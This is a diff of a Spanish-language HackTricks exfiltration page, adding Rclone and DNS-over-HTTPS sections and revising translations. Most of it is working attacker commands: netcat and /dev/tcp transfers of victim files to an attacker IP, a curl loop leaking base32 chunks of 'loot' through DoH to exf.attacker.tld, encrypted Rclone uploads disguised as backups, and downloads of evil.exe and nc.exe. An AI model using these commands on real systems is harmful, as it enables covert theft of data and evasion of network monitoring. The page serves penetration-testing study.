@@ -1,17 +1,17 @@
-# Exfiltration
+# Exfiltración
 
 {{#include ../banners/hacktricks-training.md}}
 
 > [!TIP]
-> Para un ejemplo de extremo a extremo de preparar loot en `C:\Users\Public` y exfiltrarlo con Rclone para imitar backups legítimos, revisa el flujo de trabajo abajo.
+> For an end-to-end example of staging loot in `C:\Users\Public` and exfiltrating it with Rclone to mimic legitimate backups, review the workflow below.
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## Dominios comúnmente whitelisted para exfiltrar información
+## Dominios comúnmente whitelisteados para exfiltrar información
 
-Consulta [https://lots-project.com/](https://lots-project.com/) para encontrar dominios comúnmente whitelisted que puedan ser abusados
+Revisa [https://lots-project.com/](https://lots-project.com/) para encontrar dominios comúnmente whitelisteados que pueden ser abusados
 
 ## Copy\&Paste Base64
 
@@ -110,8 +110,8 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ### goshs
 
 [goshs](https://github.com/patrickhener/goshs) es un reemplazo de un solo binario para `python3 -m http.server`
-con funciones de upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links,
-y colaboración OOB (DNS, SMTP, captura de hash NTLM).
+con subida, descarga, WebDAV, SFTP, SMB, TLS, autenticación, enlaces para compartir,
+y funciones de colaboración OOB (DNS, SMTP, captura de hash NTLM).
 ```bash
 # Serve current directory on port 8000
 goshs
@@ -140,14 +140,14 @@ goshs -smtp -smtp-domain [REDACTED]
 # Tunnel via localhost.run (no port forwarding needed)
 goshs -tunnel
 ```
-## Webhooks (Discord/Slack/Teams) para C2 y Data Exfiltration
+## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Los webhooks son endpoints HTTPS de solo escritura que aceptan JSON y partes de archivo opcionales. Por lo general, están permitidos hacia dominios SaaS de confianza y no requieren OAuth/API keys, lo que los hace útiles para beaconing y exfiltration con poca fricción.
+Los webhooks son endpoints HTTPS de solo escritura que aceptan JSON y partes de archivo opcionales. Normalmente se permiten en dominios SaaS de confianza y no requieren OAuth/API keys, lo que los hace útiles para beaconing y exfiltration con poca fricción.
 
 Key ideas:
-- Endpoint: Discord usa https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data con una parte llamada payload_json que contiene {"content":"..."} y partes de archivo opcionales llamadas file.
-- Patrón de bucle del operador: beacon periódico -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirma la entrega.
+- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirm delivery.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -218,12 +218,39 @@ Start-Sleep -Seconds 20
 }
 ```
 Notas:
-- Patrones similares se aplican a otras plataformas de colaboración (Slack/Teams) usando sus incoming webhooks; ajusta la URL y el esquema JSON en consecuencia.
-- Para DFIR de artefactos de caché de Discord Desktop y recuperación de webhook/API, consulta:
+- Patrones similares aplican a otras plataformas de colaboración (Slack/Teams) usando sus incoming webhooks; ajusta la URL y el esquema JSON en consecuencia.
+- Para DFIR de Discord Desktop cache artifacts y recuperación de webhook/API, consulta:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
 {{#endref}}
+
+## Rclone (cloud/object-storage exfiltration)
+
+Los operadores modernos a menudo **stage loot locally** y luego usan [Rclone](https://rclone.org/) para hacer que la transferencia parezca un backup o sync job normal. Un patrón práctico es:
+
+1. Un remote normal (`s3`, `webdav`, `drive`, `mega`, ...)
+2. Un wrapper `crypt` para que **contents and filenames are encrypted client-side**
+3. Un wrapper `chunker` opcional si el provider impone object-size limits o si quieres unidades de upload más pequeñas
+```bash
+# 1) Create the storage backend remote (interactive)
+rclone config              # ex: remote
+
+# 2) Wrap it with client-side encryption
+rclone config              # ex: secret -> remote:path
+
+# 3) Optional: create a chunker overlay for large objects
+rclone config              # ex: overlay -> secret:
+
+# 4) Upload staged data
+rclone copy /loot secret:$(hostname)-$(date +%F) \
+--transfers 2 --checkers 2 --bwlimit 4M
+# If you created the chunker wrapper, upload to overlay:... instead
+```
+Notas:
+- `crypt` puede cifrar tanto el contenido de los archivos como los nombres.
+- `chunker` divide de forma transparente archivos grandes y los vuelve a ensamblar al descargarlos.
+- `rclone.conf` almacena los secretos de `crypt` en una forma **obscured**, no una protección fuerte en reposo. Para operaciones de corta duración, prefiere una configuración temporal dedicada y elimínala después.
 
 ## FTP
 
@@ -232,12 +259,12 @@ Notas:
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP server (NodeJS)
+### Servidor FTP (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP server (pure-ftp)
+### Servidor FTP (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -275,7 +302,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-O crea un smb share **using samba**:
+O crear un recurso compartido smb **usando samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -299,7 +326,7 @@ WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.1
 WindPS-2> cd new_disk:
 ```
 ### goshs
-[goshs](https://github.com/patrickhener/goshs) es una alternativa de binario único
+[goshs](https://github.com/patrickhener/goshs) es una alternativa de un solo binario
 que sirve archivos sobre SMB y captura hashes NetNTLMv2 de los clientes que se conectan:
 ```bash
 # Start SMB server with NTLM hash capture
@@ -316,7 +343,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Si la víctima tiene SSH, el atacante puede montar un directorio de la víctima en el atacante.
+Si la víctima tiene SSH, el atacante puede montar un directorio desde la víctima hacia el atacante.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -334,7 +361,7 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Subir archivo al objetivo
+### Subir archivo a la víctima
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -361,6 +388,23 @@ print(f"{data.decode('utf-8')}", flush=True, end="")
 
 sniff(iface="tun0", prn=process_packet)
 ```
+## DNS sobre HTTPS (DoH)
+
+Si el DNS clásico por UDP/53 es ruidoso o está bloqueado, pero HTTPS saliente está ampliamente permitido, el patrón habitual de exfiltración mediante etiquetas DNS puede envolverse dentro de solicitudes **DoH** a un resolvedor público. Mantén cada etiqueta bastante por debajo del límite DNS de 63 bytes y usa un alfabeto seguro para DNS como Base32.
+```bash
+# Encode -> split into DNS-safe labels -> send via DoH
+base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
+nl -nrz -w4 -s. | while read chunk; do
+curl --http2 -s \
+-H 'accept: application/dns-json' \
+"https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
+>/dev/null
+done
+```
+En el servidor DNS autoritativo para `exf.attacker.tld`, ordena las consultas por el prefijo numérico y reconstruye el flujo Base32. Esto mantiene el transporte dentro de HTTPS hacia el resolvedor en lugar del clásico DNS UDP/53.
+
+Para herramientas completas de túnel DNS bidireccional (`iodine`, `dnscat2`, etc.), revisa [the tunneling page](tunneling-and-port-forwarding.md).
+
 ## **SMTP**
 
 Si puedes enviar datos a un servidor SMTP, puedes crear un SMTP para recibir los datos con python:
@@ -376,16 +420,16 @@ para capturar callbacks de email durante escenarios de exfiltration OOB:
 goshs -smtp -smtp-domain [REDACTED]
 ```
 Los correos electrónicos y callbacks recibidos se muestran directamente en la salida del terminal.
-Se puede combinar con el servidor de callback DNS para una cobertura OOB completa:
+Se puede combinar con el servidor DNS callback para una cobertura OOB completa:
 ```bash
 # DNS + SMTP combined
 goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
 ```
 ## TFTP
 
-Por defecto en XP y 2003 (en otros sistemas debe agregarse explícitamente durante la instalación)
+Por defecto en XP y 2003 (en otros necesita ser agregado explícitamente durante la instalación)
 
-En Kali, **start TFTP server**:
+En Kali, **iniciar servidor TFTP**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -403,7 +447,7 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Descarga un archivo con un oneliner de PHP:
+Descarga un archivo con un PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -445,7 +489,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-El programa `debug.exe` no solo permite inspeccionar binarios, sino que también tiene la **capacidad de reconstruirlos a partir de hex**. Esto significa que, proporcionando un hex de un binario, `debug.exe` puede generar el archivo binario. Sin embargo, es importante señalar que `debug.exe` tiene una **limitación al ensamblar archivos de hasta 64 kb de tamaño**.
+El programa `debug.exe` no solo permite la inspección de binarios, sino que también tiene la **capacidad de reconstruirlos a partir de hex**. Esto significa que, al proporcionar un hex de un binario, `debug.exe` puede generar el archivo binario. Sin embargo, es importante señalar que debug.exe tiene una **limitación de ensamblar archivos de hasta 64 kb de tamaño**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -453,15 +497,12 @@ wine exe2bat.exe nc.exe nc.txt
 ```
 Luego copia y pega el texto en el windows-shell y se creará un archivo llamado nc.exe.
 
-- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
-
-## DNS
-
-- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
-- [https://github.com/patrickhener/goshs](https://github.com/patrickhener/goshs)
-
 ## References
 
+- [Transferring files to Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+- [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
+- [Rclone `crypt` backend](https://rclone.org/crypt/)
+- [goshs](https://github.com/patrickhener/goshs)
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
 - [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
